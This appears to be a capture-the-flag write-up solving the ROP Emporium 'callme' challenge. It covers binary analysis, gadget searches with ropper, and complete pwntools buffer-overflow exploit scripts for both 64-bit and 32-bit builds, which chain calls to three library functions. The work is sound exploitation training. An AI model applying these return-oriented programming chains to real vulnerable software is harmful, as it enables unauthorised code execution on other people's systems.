## 64 bits

Executing the program

```bash
$ ./callme 
callme by ROP Emporium
x86_64

Hope you read the instructions...

> test
Thank you!

Exiting

```

<br/>

There's an encrypted flag and two keys now

```bash
$ ls
callme encrypted_flag.dat key1.dat  key2.dat  libcallme.so
```

Functions in the program:

```bash
[0x00400760]> afl
0x00400760    1 42           entry0
0x004006a8    3 23           sym._init
0x004009b4    1 9            sym._fini
0x004007a0    4 42   -> 37   sym.deregister_tm_clones
0x004007d0    4 58   -> 55   sym.register_tm_clones
0x00400810    3 34   -> 29   entry.fini0
0x00400840    1 7            entry.init0
0x00400898    1 90           sym.pwnme
0x00400700    1 6            sym.imp.memset
0x004006d0    1 6            sym.imp.puts
0x004006e0    1 6            sym.imp.printf
0x00400710    1 6            sym.imp.read
0x004008f2    1 74           sym.usefulFunction
0x004006f0    1 6            sym.imp.callme_three
0x00400740    1 6            sym.imp.callme_two
0x00400720    1 6            sym.imp.callme_one
0x00400750    1 6            sym.imp.exit
0x004009b0    1 2            sym.__libc_csu_fini
0x00400940    4 101          sym.__libc_csu_init
0x00400790    1 2            sym._dl_relocate_static_pie
0x00400847    1 81           main
0x00400730    1 6            sym.imp.setvbuf
```

<br/>

Now i'll see the assembly of usefulFunction, (main and pwnme are the same as the other challenges, and the offset is the same too)

```bash
[0x00400760]> pdf @sym.usefulFunction
┌ 74: sym.usefulFunction ();
│           0x004008f2      55             push rbp
│           0x004008f3      4889e5         mov rbp, rsp
│           0x004008f6      ba06000000     mov edx, 6
│           0x004008fb      be05000000     mov esi, 5
│           0x00400900      bf04000000     mov edi, 4
│           0x00400905      e8e6fdffff     call sym.imp.callme_three
│           0x0040090a      ba06000000     mov edx, 6
│           0x0040090f      be05000000     mov esi, 5
│           0x00400914      bf04000000     mov edi, 4
│           0x00400919      e822feffff     call sym.imp.callme_two
│           0x0040091e      ba06000000     mov edx, 6
│           0x00400923      be05000000     mov esi, 5
│           0x00400928      bf04000000     mov edi, 4
│           0x0040092d      e8eefdffff     call sym.imp.callme_one
│           0x00400932      bf01000000     mov edi, 1                  ; int status
└           0x00400937      e814feffff     call sym.imp.exit           ; void exit(int status)
```
This functions call the other functions with 3 arguments

<br/>

I'm going to open libcallme.so with ida to see the functions with the graph view

![callme1](/assets/images/ropemporium-callme64/callme1.png)

This function is testing 3 arguments, the other 2 functions does the same so now you have to find the gadget

<br/>

```bash
$ ropper -f callme | grep -i "rdi"                                                                                 
[INFO] Load gadgets for section: LOAD                                         
[LOAD] loading... 100%                                                        
[LOAD] removing double gadgets... 100%                                        
0x0000000000400884: add byte ptr [rax], al; add byte ptr [rdi + 0x4009e7], bh; call 0x6d0; mov eax, 0; pop rbp; ret;                                         
0x0000000000400935: add byte ptr [rax], al; call 0x750; pop rdi; pop rsi; pop rdx; ret; 
0x0000000000400886: add byte ptr [rdi + 0x4009e7], bh; call 0x6d0; mov eax, 0; pop rbp; ret;                                                                 
0x0000000000400937: call 0x750; pop rdi; pop rsi; pop rdx; ret;               
0x000000000040093b: lcall [rdi + 0x5e]; pop rdx; ret;                                                                                                        
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;                           
0x00000000004009a3: pop rdi; ret;
```

I'll use the pop rdi; pop rsi; pop rdx; ret;

Now you have all to make the exploit, it should be padding + gadget + arg1 + arg2 + arg3 + callme one address + gadget + arg1 + arg2 + arg3 + callme two address + gadget + arg1 + arg2 + arg3 + callme three address


```python
from pwn import *

p = process("./callme")

padding = b'a'*40

callme_one_addr = p64(0x00400720)
callme_two_addr = p64(0x00400740)
callme_three_addr = p64(0x004006f0)

gadget = p64(0x000000000040093c)

payload = padding
payload += gadget
payload += p64(0x0DEADBEEFDEADBEEF)
payload += p64(0x0CAFEBABECAFEBABE)
payload += p64(0x0D00DF00DD00DF00D)
payload += callme_one_addr
payload += gadget
payload += p64(0x0DEADBEEFDEADBEEF)
payload += p64(0x0CAFEBABECAFEBABE)
payload += p64(0x0D00DF00DD00DF00D)
payload += callme_two_addr
payload += gadget
payload += p64(0x0DEADBEEFDEADBEEF)
payload += p64(0x0CAFEBABECAFEBABE)
payload += p64(0x0D00DF00DD00DF00D)
payload += callme_three_addr


p.sendline(payload)
p.interactive()
```

<br/>

## 32 bits

Now there are more files

```bash
$ ls
callme32  callme32.zip  encrypted_flag.dat  key1.dat  key2.dat  libcallme32.so
```

<br/>

Executing the program

```bash
$ ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> test
Thank you!

Exiting
```

<br/>

List of the funcitons

```bash
[0x08048570]> afl
0x08048570    1 50           entry0
0x080485a3    1 4            fcn.080485a3
0x08048520    1 6            sym.imp.__libc_start_main
0x0804848c    3 35           sym._init
0x080485c0    1 4            sym.__x86.get_pc_thunk.bx
0x08048804    1 20           sym._fini
0x080485d0    4 50   -> 41   sym.deregister_tm_clones
0x08048610    4 58   -> 54   sym.register_tm_clones
0x08048650    3 34   -> 31   entry.fini0
0x08048680    1 6            entry.init0
0x080486ed    1 98           sym.pwnme
0x08048540    1 6            sym.imp.memset
0x08048500    1 6            sym.imp.puts
0x080484d0    1 6            sym.imp.printf
0x080484c0    1 6            sym.imp.read
0x0804874f    1 67           sym.usefulFunction
0x080484e0    1 6            sym.imp.callme_three
0x08048550    1 6            sym.imp.callme_two
0x080484f0    1 6            sym.imp.callme_one
0x08048510    1 6            sym.imp.exit
0x08048800    1 2            sym.__libc_csu_fini
0x080487a0    4 93           sym.__libc_csu_init
0x080485b0    1 2            sym._dl_relocate_static_pie
0x08048686    1 103          main
0x08048530    1 6            sym.imp.setvbuf
```

<br/>

Now the assembly of the usefulFunction

```bash
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804874f <+0>:     push   ebp
   0x08048750 <+1>:     mov    ebp,esp
   0x08048752 <+3>:     sub    esp,0x8
   0x08048755 <+6>:     sub    esp,0x4
   0x08048758 <+9>:     push   0x6
   0x0804875a <+11>:    push   0x5
   0x0804875c <+13>:    push   0x4
   0x0804875e <+15>:    call   0x80484e0 <callme_three@plt>
   0x08048763 <+20>:    add    esp,0x10
   0x08048766 <+23>:    sub    esp,0x4
   0x08048769 <+26>:    push   0x6
   0x0804876b <+28>:    push   0x5
   0x0804876d <+30>:    push   0x4
   0x0804876f <+32>:    call   0x8048550 <callme_two@plt>
   0x08048774 <+37>:    add    esp,0x10
   0x08048777 <+40>:    sub    esp,0x4
   0x0804877a <+43>:    push   0x6
   0x0804877c <+45>:    push   0x5
   0x0804877e <+47>:    push   0x4
   0x08048780 <+49>:    call   0x80484f0 <callme_one@plt>
   0x08048785 <+54>:    add    esp,0x10
   0x08048788 <+57>:    sub    esp,0xc
   0x0804878b <+60>:    push   0x1
   0x0804878d <+62>:    call   0x8048510 <exit@plt>
End of assembler dump.
```

<br/>

Now i'll open ida for the libcallme32.so

![callme321](/images/ropemporium-callme32/callme321.png)

So we have to pass the arguments and call the function but before there's a ROP gadget needed

```bash
$ ropper -f callme32 | grep "esi"
0x080487f9: pop esi; pop edi; pop ebp; ret; 
```

<br/>

The exploit should be pad + callme one + gadget + arg1 + arg2 + arg3 + callme two + gadget + arg1 + arg2 + arg3 + callme three + gadget + arg1 + arg2 + arg3

<br/>

And here's the exploit

```python
from pwn import *

p = process("./callme32")

pad = b'a'*44

arg1 = p32(0x0DEADBEEF)
arg2 = p32(0x0CAFEBABE)
arg3 = p32(0x0D00DF00D)

callme_one_addr = p32(0x080484f0)
callme_two_addr = p32(0x08048550)
callme_three_addr = p32(0x080484e0)

gadget = p32(0x080487f9)

payload = pad
payload += callme_one_addr
payload += gadget
payload += arg1
payload += arg2
payload += arg3
payload += callme_two_addr
payload += gadget
payload += arg1
payload += arg2
payload += arg3
payload += callme_three_addr
payload += gadget
payload += arg1
payload += arg2
payload += arg3


p.sendline(payload)
p.interactive()
```
